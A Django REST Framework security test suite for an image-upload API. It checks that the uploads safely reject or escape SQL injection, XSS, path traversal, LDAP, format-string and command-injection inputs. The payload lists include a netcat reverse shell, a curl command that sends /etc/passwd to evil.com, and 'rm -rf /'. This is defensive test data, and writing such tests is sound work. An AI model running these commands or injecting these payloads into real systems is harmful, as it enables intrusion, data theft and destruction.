from django.urls import reverse
from rest_framework import status

from tests.security.base import SecurityTestBase


class InputValidationTest(SecurityTestBase):
    """
    Test suite for input validation and sanitization security
    """

    def test_sql_injection_in_image_description(self):
        """Test that SQL injection attempts in image descriptions are handled safely"""
        self.authenticate_user(self.user_a)

        sql_injection_payloads = [
            "'; DROP TABLE api_sourceimage; --",
            "'; DELETE FROM api_sourceimage; --",
            "' OR '1'='1",
            "'; INSERT INTO api_sourceimage (description) VALUES ('hacked'); --",
            "1' UNION SELECT * FROM auth_user --",
            "'; UPDATE api_sourceimage SET description='hacked' WHERE id=1; --",
            "admin'--",
            "' OR 1=1--",
            "'; EXEC xp_cmdshell('dir'); --",
        ]

        for payload in sql_injection_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test_sql.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": "test.jpg",
                        "description": payload,
                        "metadata": "{}",
                    },
                )

                # Should either accept it (properly escaped) or reject it
                # Should not cause a server error (500)
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

                # If accepted, verify it was properly escaped
                if response.status_code == status.HTTP_201_CREATED:
                    # The payload should be stored as-is (escaped by Django ORM)
                    # but not executed as SQL
                    self.assertIn("description", response.data)

    def test_xss_in_image_metadata(self):
        """Test that XSS payloads in image metadata are properly handled"""
        self.authenticate_user(self.user_a)

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click me</div>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<SCRIPT SRC=http://evil.com/xss.js></SCRIPT>",
        ]

        for payload in xss_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test_xss.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": payload,  # XSS in filename
                        "description": f"Description with {payload}",  # XSS in description
                        "metadata": f'{{"title": "{payload}"}}',  # XSS in metadata
                    },
                )

                # Should either accept it (properly escaped) or reject it
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

                # If accepted, verify the response doesn't contain unescaped XSS
                if response.status_code == status.HTTP_201_CREATED:
                    response_str = str(response.data)
                    # Check that dangerous script tags are not present unescaped
                    self.assertNotIn("<script>", response_str.lower())
                    self.assertNotIn("javascript:", response_str.lower())

    def test_path_traversal_in_filenames(self):
        """Test that path traversal attempts in filenames are handled safely"""
        self.authenticate_user(self.user_a)

        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../root/.ssh/id_rsa",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..\\..\\..\\autoexec.bat",
            "/etc/passwd",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..\\\\..\\\\..\\\\etc\\\\passwd",
        ]

        for payload in path_traversal_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": payload,
                        "description": "Test description",
                        "metadata": "{}",
                    },
                )

                # Should handle this safely - either reject or sanitize
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

                # If accepted, ensure the filename was sanitized
                if response.status_code == status.HTTP_201_CREATED:
                    returned_filename = response.data.get("file_name", "")
                    # Should not contain path traversal characters
                    self.assertNotIn("..", returned_filename)
                    self.assertNotIn("\\", returned_filename)
                    self.assertNotIn("/etc/", returned_filename)
                    self.assertNotIn("C:\\", returned_filename)

    def test_excessively_long_inputs(self):
        """Test handling of excessively long input strings"""
        self.authenticate_user(self.user_a)

        # Test with various long inputs
        long_inputs = {
            "file_name": "a" * 1000,  # Very long filename
            "description": "b" * 10000,  # Very long description
        }

        for field, value in long_inputs.items():
            with self.subTest(field=field, length=len(value)):
                image_file = self.create_test_image_file("test.jpg")

                data = {
                    "file": image_file,
                    "file_name": "test.jpg",
                    "description": "Test description",
                    "metadata": "{}",
                }
                data[field] = value

                response = self.client.post(reverse("source_image_upload"), data)

                # Should handle gracefully - likely reject due to length
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_null_bytes_in_input(self):
        """Test handling of null bytes in input data"""
        self.authenticate_user(self.user_a)

        null_byte_inputs = [
            "test\x00filename.jpg",
            "description\x00with\x00nulls",
            "test\x00\x00\x00.jpg",
            "\x00startingnull.jpg",
            "endingnull\x00",
        ]

        for input_value in null_byte_inputs:
            with self.subTest(input_value=repr(input_value)):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": input_value,
                        "description": input_value,
                        "metadata": "{}",
                    },
                )

                # Should handle null bytes safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_unicode_injection_attempts(self):
        """Test handling of unicode injection attempts"""
        self.authenticate_user(self.user_a)

        unicode_payloads = [
            "test\u202e.gpj",  # Right-to-left override
            "test\u200b.jpg",  # Zero width space
            "test\ufeff.jpg",  # Byte order mark
            "test\u0000.jpg",  # Null character
            "test\u0009.jpg",  # Tab character
            "test\u000a.jpg",  # Line feed
            "test\u000d.jpg",  # Carriage return
            "test\u001f.jpg",  # Unit separator
        ]

        for payload in unicode_payloads:
            with self.subTest(payload=repr(payload)):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": payload,
                        "description": "Test description",
                        "metadata": "{}",
                    },
                )

                # Should handle unicode characters safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_json_injection_in_metadata(self):
        """Test JSON injection attempts in metadata field"""
        self.authenticate_user(self.user_a)

        json_injection_payloads = [
            '{"test": "value", "injected": "data"}',
            '{"test": "value"}; DROP TABLE api_sourceimage; --',
            '{"test": "<script>alert(\'XSS\')</script>"}',
            '{"test": "../../../etc/passwd"}',
            '{"constructor": {"prototype": {"isAdmin": true}}}',  # Prototype pollution
            '{"__proto__": {"isAdmin": true}}',  # Prototype pollution
            '"}; alert("XSS"); {"',  # Breaking out of JSON
        ]

        for payload in json_injection_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": "test.jpg",
                        "description": "Test description",
                        "metadata": payload,
                    },
                )

                # Should handle JSON safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_html_injection_in_descriptions(self):
        """Test HTML injection attempts in description fields"""
        self.authenticate_user(self.user_a)

        html_injection_payloads = [
            "<h1>Injected Header</h1>",
            "<form><input type='password'></form>",
            "<link rel='stylesheet' href='http://evil.com/style.css'>",
            "<meta http-equiv='refresh' content='0;url=http://evil.com'>",
            "<base href='http://evil.com/'>",
            "<object data='http://evil.com/malware.swf'></object>",
            "<embed src='http://evil.com/malware.swf'>",
            "<applet code='MaliciousApplet.class'></applet>",
        ]

        for payload in html_injection_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": "test.jpg",
                        "description": payload,
                        "metadata": "{}",
                    },
                )

                # Should handle HTML safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_command_injection_attempts(self):
        """Test command injection attempts in input fields"""
        self.authenticate_user(self.user_a)

        command_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "& dir",
            "`whoami`",
            "$(whoami)",
            "; rm -rf /",
            "| nc evil.com 4444 -e /bin/sh",
            "; curl evil.com/steal?data=$(cat /etc/passwd)",
            "'; echo 'pwned' > /tmp/pwned; '",
            "&& echo 'command executed'",
        ]

        for payload in command_injection_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": f"test{payload}.jpg",
                        "description": f"Description{payload}",
                        "metadata": "{}",
                    },
                )

                # Should handle command injection attempts safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_ldap_injection_attempts(self):
        """Test LDAP injection attempts in input fields"""
        self.authenticate_user(self.user_a)

        ldap_injection_payloads = [
            "*)(uid=*",
            "*)(|(uid=*))",
            "*)(&(uid=*)",
            "*))%00",
            "*)(|(password=*))",
            "*)(|(objectClass=*))",
            "*)(|(cn=*))",
            "admin*",
            "*)(|(uid=admin)(cn=admin))",
        ]

        for payload in ldap_injection_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": f"test_{payload}.jpg",
                        "description": f"Description {payload}",
                        "metadata": "{}",
                    },
                )

                # Should handle LDAP injection attempts safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_integer_overflow_attempts(self):
        """Test integer overflow attempts in numeric fields"""
        self.authenticate_user(self.user_a)

        # Create an image first to test transformation
        source_image = self.create_test_source_image(self.user_a)

        overflow_values = [
            2147483647,  # Max 32-bit signed int
            2147483648,  # Max 32-bit signed int + 1
            4294967295,  # Max 32-bit unsigned int
            4294967296,  # Max 32-bit unsigned int + 1
            9223372036854775807,  # Max 64-bit signed int
            -2147483648,  # Min 32-bit signed int
            -2147483649,  # Min 32-bit signed int - 1
        ]

        for value in overflow_values:
            with self.subTest(value=value):
                transformation_data = {
                    "transformations": [
                        {"type": "resize", "width": value, "height": 100}
                    ],
                    "format": "JPEG",
                }

                response = self.client.post(
                    reverse("create_transformed_image", kwargs={"pk": source_image.pk}),
                    transformation_data,
                    format="json",
                )

                # Should handle large integers safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_format_string_attacks(self):
        """Test format string attack attempts"""
        self.authenticate_user(self.user_a)

        format_string_payloads = [
            "%s%s%s%s%s%s%s%s%s%s",
            "%x%x%x%x%x%x%x%x%x%x",
            "%n%n%n%n%n%n%n%n%n%n",
            "AAAA%p%p%p%p",
            "AAAA%x%x%x%x",
            "%s%p%x%d",
            "%08x" * 10,
            "%.1000d",
            "%99999999999999999999999999999999999999999999999999999999s",
        ]

        for payload in format_string_payloads:
            with self.subTest(payload=payload):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": payload,
                        "description": payload,
                        "metadata": "{}",
                    },
                )

                # Should handle format string attacks safely
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_empty_and_whitespace_inputs(self):
        """Test handling of empty and whitespace-only inputs"""
        self.authenticate_user(self.user_a)

        whitespace_inputs = [
            "",  # Empty string
            "   ",  # Spaces
            "\t\t\t",  # Tabs
            "\n\n\n",  # Newlines
            "\r\r\r",  # Carriage returns
            "   \t\n\r   ",  # Mixed whitespace
        ]

        for input_value in whitespace_inputs:
            with self.subTest(input_value=repr(input_value)):
                image_file = self.create_test_image_file("test.jpg")

                response = self.client.post(
                    reverse("source_image_upload"),
                    {
                        "file": image_file,
                        "file_name": input_value
                        or "default.jpg",  # Provide default if empty
                        "description": input_value,
                        "metadata": "{}",
                    },
                )

                # Should handle empty/whitespace inputs appropriately
                # 429 (rate limiting) is also acceptable as a security measure
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )

    def test_transformation_sanitization(self):
        """Test that transformation data is properly sanitized"""
        self.authenticate_user(self.user_a)

        # Create a source image first
        source_image = self.create_test_source_image(self.user_a)

        # Test various malicious transformation payloads
        malicious_transformations = [
            # XSS in operation
            [
                {
                    "operation": "<script>alert('XSS')</script>",
                    "params": {"width": 100, "height": 100},
                }
            ],
            # XSS in params
            [
                {
                    "operation": "resize",
                    "params": {"width": "<script>alert('XSS')</script>", "height": 100},
                }
            ],
            # Javascript protocol
            [
                {
                    "operation": "javascript:alert('XSS')",
                    "params": {"width": 100, "height": 100},
                }
            ],
            # Injection in operation
            [
                {
                    "operation": "resize'; DROP TABLE api_sourceimage; --",
                    "params": {"width": 100, "height": 100},
                }
            ],
            # Dangerous operation
            [{"operation": "exec", "params": {"command": "rm -rf /"}}],
            # Path traversal in params
            [
                {
                    "operation": "resize",
                    "params": {"path": "../../../etc/passwd", "width": 100},
                }
            ],
            # HTML tags in params
            [
                {
                    "operation": "resize",
                    "params": {"title": "<h1>Injected Header</h1>", "width": 100},
                }
            ],
        ]

        for transformations in malicious_transformations:
            with self.subTest(transformations=transformations):
                transformation_data = {
                    "transformations": transformations,
                    "format": "JPEG",
                }

                response = self.client.post(
                    reverse("create_transformed_image", kwargs={"pk": source_image.pk}),
                    transformation_data,
                    format="json",
                )

                # Should handle malicious transformations safely
                # Either accept (after sanitization) or reject
                self.assertIn(
                    response.status_code,
                    [
                        status.HTTP_201_CREATED,
                        status.HTTP_400_BAD_REQUEST,
                        status.HTTP_429_TOO_MANY_REQUESTS,
                    ],
                )
